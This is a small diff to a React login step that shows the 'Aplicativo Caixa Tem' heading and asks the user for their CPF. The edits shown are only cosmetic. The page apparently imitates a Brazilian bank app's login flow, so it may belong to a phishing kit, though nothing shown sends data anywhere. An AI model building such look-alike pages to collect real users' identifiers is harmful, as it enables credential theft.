@@ -18,6 +18,7 @@ const useStyles = makeStyles((theme) => ({
         width: '77vw',
         textAlign: 'center',
     },
+    
 }));
 
 const Step1 = ({ nextStep, loginData, setLoginData }) => {
@@ -53,7 +54,7 @@ const Step1 = ({ nextStep, loginData, setLoginData }) => {
 
 <div className="App-header">
        <img src={logo} className="logo" />
-            <h2>Aplicativo Caixa Tem</h2>
+            <h2 className="h2texto">Aplicativo Caixa Tem</h2>
 
             <p> Informe seu CPF e clique em "Próximo" para continuar: </p>
             <div>
